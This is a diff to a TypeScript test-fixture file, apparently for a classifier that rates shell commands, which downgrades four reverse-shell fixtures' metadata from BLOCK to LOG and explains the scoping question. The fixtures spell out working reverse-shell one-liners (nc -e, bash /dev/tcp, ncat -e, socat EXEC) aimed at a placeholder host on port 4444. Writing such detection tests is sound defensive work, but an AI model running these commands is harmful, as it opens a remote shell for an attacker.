@@ -25,8 +25,10 @@ const REVERSE_SHELL_EXPECT = {
 
 const REVERSE_SHELL_WHY = 'No reverse-shell signal exists on main: netcat-family exec flags, socat exec addresses and '
   + '/dev/tcp redirection with descriptor duplication all score allow (5.20.0 probe, 15 Nov 2026). '
-  + 'SCN-009 adds an interim approval-tier row (a door, never catastrophic); v3 lists it as BLOCK pending '
-  + 'the owner\'s block-list scoping answer.';
+  + 'The expect block is the interim classifier target only: SCN-009 adds an approval-tier row (a door, never '
+  + 'catastrophic). The adr field is separate v3 metadata: the shape is not on the fixed published block list, '
+  + 'so v3 as written assigns LOG by default. Whether the list should name it is an open block-list scoping '
+  + 'question for the owner (v3 names the #1005 reverse-shell case); no owner decision is recorded.';
 
 export const PHASE3_FIXTURES: FrozenFixture[] = [
   {
@@ -39,7 +41,7 @@ export const PHASE3_FIXTURES: FrozenFixture[] = [
     ...bash(`nc -e /bin/sh ${HOST} 4444`),
     effects: ['code-exec-opaque', 'egress'],
     targets: [`${HOST}:4444`],
-    adr: 'BLOCK',
+    adr: 'LOG',
     expect: REVERSE_SHELL_EXPECT,
     why: REVERSE_SHELL_WHY,
   },
@@ -53,7 +55,7 @@ export const PHASE3_FIXTURES: FrozenFixture[] = [
     ...bash(`bash -i >& /dev/tcp/${HOST}/4444 0>&1`),
     effects: ['code-exec-opaque', 'egress'],
     targets: [`${HOST}:4444`],
-    adr: 'BLOCK',
+    adr: 'LOG',
     expect: REVERSE_SHELL_EXPECT,
     why: REVERSE_SHELL_WHY,
   },
@@ -67,7 +69,7 @@ export const PHASE3_FIXTURES: FrozenFixture[] = [
     ...bash(`ncat -e /bin/bash ${HOST} 4444`),
     effects: ['code-exec-opaque', 'egress'],
     targets: [`${HOST}:4444`],
-    adr: 'BLOCK',
+    adr: 'LOG',
     expect: REVERSE_SHELL_EXPECT,
     why: REVERSE_SHELL_WHY,
   },
@@ -81,7 +83,7 @@ export const PHASE3_FIXTURES: FrozenFixture[] = [
     ...bash(`socat TCP:${HOST}:4444 EXEC:/bin/sh`),
     effects: ['code-exec-opaque', 'egress'],
     targets: [`${HOST}:4444`],
-    adr: 'BLOCK',
+    adr: 'LOG',
     expect: REVERSE_SHELL_EXPECT,
     why: REVERSE_SHELL_WHY,
   },
